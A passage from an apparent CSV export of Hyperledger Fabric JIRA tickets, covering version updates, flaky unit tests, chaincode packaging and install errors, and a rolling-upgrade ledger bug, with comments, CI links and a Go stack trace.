5) The remaining Orderers are still trying to communicate to the removed Orderers",,Unset,,,,,,Unset,,Unset,,(Please add usage information),ahmedsajid,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/20 4:07 AM;denyeart;[~guoger] What do you think?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Update Contract, Chaincode, and SDKs from 2.0.0-beta to 2.0.0",FAB-17447,44153,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mbwhite,mbwhite,mbwhite,28/Jan/20 6:36 PM,29/Jan/20 2:37 PM,28/Oct/23 3:09 AM,28/Jan/20 11:41 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,"Update, where possible, the versions from beta to GA.

The SDKs, a Contract libraries have been published at 2.0.0 so it's ok to make this change

The Nodejs Gateway and Network will stay at beta - the release of these is delayed. ",,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018bv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),mbwhite,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TestDBRequestTimeout fails in core/ledger/util/couchdb,FAB-17448,44157,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,btl5037,btl5037,28/Jan/20 11:19 PM,19/Mar/20 5:29 AM,28/Oct/23 3:09 AM,19/Mar/20 5:29 AM,,,,,,,,,,v2.1.0,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"We've been hitting this left and right in CI, this is at least the 8th failure I've alone observed. Presumably it has something to do with the work in FAB-17339
{code:java}
--- FAIL: TestDBRequestTimeout (0.18s)
    couchdb_test.go:622: 
        	Error Trace:	couchdb_test.go:622
        	Error:      	An error is expected but got nil.
        	Test:       	TestDBRequestTimeout
        	Messages:   	Error should have been thown while trying to create a couchdb instance with a connection timeout
{code}
[https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=6215&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d&l=2093]",,btl5037,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018c3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jan/20 11:21 PM;btl5037;[~dereckluo] This failure started happening after the introduction of your CouchDB test changes, it was never observed before that. Can you take a look;;;","29/Jan/20 1:31 AM;dereckluo;Interestingly this error is due to couchDB instance is being created under ""impossibleTimeout"" (1 ms). 

There are multiple places in this package that does not start couchDB correctly, this might lead to this issue.
Fix has been applied, and let's see if this flake still happens. 
https://github.com/hyperledger/fabric/pull/578;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: add barebones test into daily suote,FAB-17449,44158,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,28/Jan/20 11:20 PM,07/Feb/20 1:21 AM,28/Oct/23 3:09 AM,04/Feb/20 3:46 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Add barebones test (FAB-17350) into daily suite. ,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17350,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|i018cb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Feb/20 12:33 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/78];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode install returns invalid reference format error,FAB-17450,44162,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,tongliofcary,tongliofcary,29/Jan/20 5:23 AM,26/Apr/20 1:06 PM,28/Oct/23 3:09 AM,26/Apr/20 1:06 PM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,help-wanted,ipm2,quality,,,"if chaincode runtime baseos is misconfigured (such as using a non exist baseos tag), chaincode install will return an error states the following:

```2020-01-28 19:27:12.543 UTC [lscc] executeDeployOrUpgrade -> ERRO 001 cannot get package for chaincode (firstchaincode:1.0)-err:open /var/hyperledger/production/chaincodes/firstchaincode.1.0: no such file or directory
2020-01-28 19:52:48.583 UTC [dockercontroller] buildImage -> ERRO 002 Error building image: invalid reference format
2020-01-28 19:52:48.583 UTC [dockercontroller] buildImage -> ERRO 003 Build Output:
********************
Step 1/4 : FROM hyperledger/fabric-baseos:amd64-$(BASE_VERSION)```

It will be extra nice if the error message be more specific.",,denyeart,tongliofcary,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018d7:",,,,Unset,Unset,,"in core.yaml , configure the chaincode:golang:runtime like this

runtime: $(DOCKER_NS)/fabric-baseos:amd-something

Then start up peer, and install some chaincode",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tongliofcary,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/20 4:00 AM;denyeart;An error like the following would really help people understand which images were attempting to be used when the failure occurred:

"" Failed to build chaincode image using image [hyperledger/fabric-ccenv:2.0] with base image [hyperledger:fabric-baseos:amd-something] "";;;","26/Apr/20 1:06 PM;denyeart;I tried this on v2.1. Actually I get good error messages now returned to the client.

If the base runtime image (baseos) is not found you get an error like this:

Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: manifest for *hyperledger/fabric-baseos:2.1.0XXX not found*: manifest unknown: manifest unknown

If the builder image (ccenv) is not found you get an error like this:

Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: docker build failed: *Failed to pull hyperledger/fabric-ccenv:latestXXX*: API error (404): manifest for hyperledger/fabric-ccenv:latestXXX not found: manifest unknown: manifest unknown

Since it appears to be resolved, closing the issue...;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
gossip unit test flakes,FAB-17451,44164,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,29/Jan/20 9:38 AM,23/Nov/20 11:37 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,ci-flake,,,,,"Three gossip failures in a row, so I'll open under a common bug...

*1)*

--- FAIL: TestWithStaticDeliverClientNotLeader (30.00s)
    gossip_service_test.go:627: Failed to establish full channel membership. Only 0 out of 2 peers have full membership

FAIL	github.com/hyperledger/fabric/gossip/service	92.374s

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=6325&view=logs&jobId=0a97ca82-e6d7-53d3-520d-b1d88f915027&j=0a97ca82-e6d7-53d3-520d-b1d88f915027&t=02e77de7-5c5f-5e0e-2a53-20d32fa2f823

See attachment for issue #1.


*2)*

--- FAIL: TestWithStaticDeliverClientBothStaticAndLeaderElection (30.00s)
    gossip_service_test.go:627: Failed to establish full channel membership. Only 0 out of 2 peers have full membership

FAIL	github.com/hyperledger/fabric/gossip/service	117.405s

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=6325&view=logs&jobId=0a97ca82-e6d7-53d3-520d-b1d88f915027&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d


*3)*

panic: test timed out after 20m0s

FAIL	github.com/hyperledger/fabric/gossip/comm	1200.118s

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=6325&view=logs&jobId=0a97ca82-e6d7-53d3-520d-b1d88f915027&j=a11cdf60-0d11-5130-c801-1b4953009464&t=5e6c925f-2981-5207-dd06-5e1b24383e25",,denyeart,MHBauer,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Apr/20 5:13 AM;sykesm;gossip-ut-timeout.log;https://jira.hyperledger.org/secure/attachment/18214/gossip-ut-timeout.log","06/May/20 12:00 AM;wenjian;gossip_service_ut_05052020.txt;https://jira.hyperledger.org/secure/attachment/18321/gossip_service_ut_05052020.txt","29/Jan/20 11:27 AM;denyeart;unit_test_log.txt;https://jira.hyperledger.org/secure/attachment/18115/unit_test_log.txt",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01h81:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,MHBauer,wenjian,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Apr/20 3:52 AM;MHBauer;TestCommSend times out

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=11073&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d;;;","05/May/20 11:58 PM;wenjian;Failed to establish full channel membership. Log is attached.
{quote}2020-05-05T02:23:45.9407166Z --- FAIL: TestWithStaticDeliverClientLeader (46.00s) 2020-05-05T02:23:45.9407661Z gossip_service_test.go:626: Failed to establish full channel membership. Only 0 out of 2 peers have full membership 2020-05-05T02:23:45.9408050Z FAIL 2020-05-05T02:23:45.9408235Z coverage: 47.9% of statements 2020-05-05T02:23:45.9408466Z FAIL github.com/hyperledger/fabric/gossip/service 62.086s
{quote};;;","03/Jun/20 8:29 AM;wenjian;Hit the error again: [https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/15209/logs/73]

2020-06-02T23:00:39.3648328Z --- FAIL: TestLeaderYield (30.06s) 2020-06-02T23:00:39.3648730Z gossip_service_test.go:627: Failed to establish full channel membership. Only 0 out of 2 peers have full membership;;;","26/Jun/20 4:47 AM;wenjian;Hit the error again on 6/25/2020, [https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/16383/logs/53]

2020-06-25T17:41:35.5613566Z — FAIL: TestLeaderYield (30.05s) 2020-06-25T17:41:35.5613904Z gossip_service_test.go:627: Failed to establish full channel membership. Only 0 out of 2 peers have full membership;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should test that multiple contracts can form a chaincode,FAB-17452,44166,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,awjh-ibm,awjh-ibm,awjh-ibm,29/Jan/20 7:38 PM,29/Jan/20 7:38 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,,,,,,The tool shold test that a chaincode can be made up of multiple contracts and these can be called by their names and the default contract can be without specifying the name but just the function name,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i018dv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
'peer lifecycle chaincode package' mandates MSPCONFIG information (unnecesarilly),FAB-17453,44169,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,xwu,mbwhite,mbwhite,29/Jan/20 11:52 PM,17/Feb/20 11:10 AM,28/Oct/23 3:09 AM,16/Feb/20 9:36 PM,v2.0.0,,,,,,,,,v2.0.1,v2.1.0,,,fabric-cli,,,,,,,,,0,,,,,,"When running the command  

peer lifecycle chaincode package ./transfer-contract.tgz --lang node --path ./transfer-contract --label tc_0

This error appears:

2020-01-29 14:48:58.621 GMT [main] InitCmd -> ERRO 001 Cannot run peer because cannot init crypto, folder ""/usr/local/config/msp"" does not exist

 

Can resolve this my setting the `CORE_PEER_MSPCONFIGPATH`. However as this is needed at development time when I might not have any credentials. I might never have any if I'm just developing and packaging.

Believe that this command should not fail if msp is not set.

 ",,denyeart,mbwhite,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018ej:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mbwhite,xwu,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Feb/20 3:52 AM;denyeart;[~wlahti] What do you think, is there an easy fix?;;;","13/Feb/20 8:32 PM;xwu;The error is caused by function InitCrypto called by function  common.InitCmd, which is a hook function of cobra.Command(chaincodeCmd), in file internal/peer/lifecycle/chaincode/chaincode.go. I thought of two ways to eliminate the effect of this function.

The first method is to separate the ""package"" command from other commands, such as install, queryinstalled, approvedformyorg, etc. Define a new cobra.Command variable to register ""package"" command, instead of the variable chaincodeCmd, and the new variable does not register function common.InitCmd as a hook function.

And the second method is to modify function common.InitCmd. If the function is called by commod ""peer lifecycle chaincode package"", skip function InitCrypto. 

I think the second modification method is simpler and I prefer it. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JOB_TYPE=PROFILE is broken,FAB-17454,44170,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,sykesm,xlswirlds,xlswirlds,30/Jan/20 12:32 AM,31/Jan/20 6:30 PM,28/Oct/23 3:09 AM,31/Jan/20 6:30 PM,v2.0.0,,,,,,,,,,,,,fabric-build,,,,,,,,,0,,,,,,"JOB_TYPE=PROFILE make unit-test ends up with a ""Nothing to test!!!"" message, and no test cases will run at all.

The issue is the combined effect set by ""set -e -o pipefail"" and the function join_by returning status code 1 from  [ ""$#"" -ne 0 ]  when join_by is called with only 1 arg. And that's the case when JOB_TYPE=PROFILE, conditional_packages is set to an empty array so join_by is called with just the delimiter.",,sykesm,xlswirlds,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16184,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018er:",,,,Unset,Unset,,"1. cd to root of the fabric repo
2. run the command: JOB_TYPE=PROFILE make unit-test",,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,xlswirlds,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jan/20 2:15 AM;sykesm;https://github.com/hyperledger/fabric/pull/602 - master
https://github.com/hyperledger/fabric/pull/603 - release-2.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric-samples to pass connection profile object (rather than reading from file),FAB-17456,44178,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harrisob@us.ibm.com,harrisob@us.ibm.com,harrisob@us.ibm.com,30/Jan/20 4:59 AM,19/Feb/20 2:06 AM,28/Oct/23 3:09 AM,19/Feb/20 2:06 AM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,sdk-triaged,,,,,"We don't want to be reading from file, so rather than update the node-sdk to handle file paths, we should update the samples to ensure what is passed to the node-sdk api is an object already read from file",,harrisob@us.ibm.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzx33q:s97w",,,,Unset,Unset,24-31st Jan 2020,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),harrisob@us.ibm.com,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Commercial Paper to test-network,FAB-17457,44190,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mbwhite,mbwhite,mbwhite,31/Jan/20 12:24 AM,19/Apr/20 1:01 PM,28/Oct/23 3:09 AM,19/Apr/20 1:01 PM,v2.0.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"1 ) utiliize the test-network for commercial paper. This is a 2org network to matches the Commecial Paper scenio

2) Move from docker-compose.yml for each user to the local peer command in line with the test-network",,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018i3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),mbwhite,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jan/20 12:25 AM;mbwhite;[https://github.com/hyperledger/fabric-samples/pull/109];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rolling upgrade - Peer at V1_4_2 capability adds v2.0 lifecycle Sequence in readset,FAB-17458,44191,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wenjian,denyeart,denyeart,31/Jan/20 1:10 AM,06/Feb/20 11:56 PM,28/Oct/23 3:09 AM,06/Feb/20 11:56 PM,v2.0.0,,,,,,,,,v2.0.1,v2.1.0,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,"Peer running at V1_4_2 capability should not consider v2.0 _lifecycle at endorsement or validation time. However there are two reads of _lifecycle Sequence in each endorsement:

2020-01-30 11:06:20.969 EST [statecouchdb] GetState -> DEBU 14c GetState(). ns=_lifecycle, key=namespaces/fields/marbles/Sequence
goroutine 206 [running]:
runtime/debug.Stack(0x0, 0x0, 0x0)
	/usr/local/go/src/runtime/debug/stack.go:24 +0x9d
runtime/debug.PrintStack()
	/usr/local/go/src/runtime/debug/stack.go:16 +0x22
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*VersionedDB).GetState(0xc000155340, 0x4f87b50, 0xa, 0xc0000d8ed0, 0x22, 0xff, 0xbf84dd9f39c4a688, 0x15ae13e08)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:371 +0x12e
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*queryHelper).getState(0xc003204120, 0x4f87b50, 0xa, 0xc0000d8ed0, 0x22, 0x4070c3c, 0x5b2d640, 0xc000460d80, 0x3, 0xc0031e2b70, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/helper.go:55 +0x8c
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*lockBasedQueryExecutor).GetState(0xc003208060, 0x4f87b50, 0xa, 0xc0000d8ed0, 0x22, 0x0, 0x0, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/lockbased_query_executer.go:28 +0x66
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*SimpleQueryExecutorShim).GetState(0xc0031f17c0, 0xc0000d8ed0, 0x22, 0x4, 0x4, 0xc0000d8ed0, 0x22, 0xe)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/ledger_shim.go:121 +0x5d
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*Serializer).DeserializeField(0xc0000daa38, 0x4f8808c, 0xa, 0xc0023c6f40, 0x7, 0x4f85648, 0x8, 0x515e000, 0xc0031f17c0, 0x20, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/serializer.go:380 +0x19f
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*Serializer).DeserializeFieldAsInt64(0xc0000daa38, 0x4f8808c, 0xa, 0xc0023c6f40, 0x7, 0x4f85648, 0x8, 0x515e000, 0xc0031f17c0, 0x5a66060, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/serializer.go:437 +0xa8
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*ChaincodeEndorsementInfoSource).CachedChaincodeInfo(0xc0022daea0, 0xc0023c6f00, 0x9, 0xc0023c6f40, 0x7, 0xa600af0, 0xc003208060, 0x48e5870, 0xc0031e2f70, 0x400ca15, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/endorsment_info.go:65 +0x114
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*ChaincodeEndorsementInfoSource).ChaincodeEndorsementInfo(0xc0022daea0, 0xc0023c6f00, 0x9, 0xc0023c6f40, 0x7, 0xa600af0, 0xc003208060, 0x400ca15, 0x4e9e820, 0x4f5ca20)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/endorsment_info.go:112 +0x1ed
github.com/hyperledger/fabric/core/endorser.(*SupportImpl).ChaincodeEndorsementInfo(0xc0022cb5e0, 0xc0023c6f00, 0x9, 0xc0023c6f40, 0x7, 0xa600a60, 0xc003208060, 0x0, 0x0, 0xc0031e3110)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/support.go:131 +0xbf
github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposalSuccessfullyOrError(0xc002303f20, 0xc0031ea500, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:386 +0x202
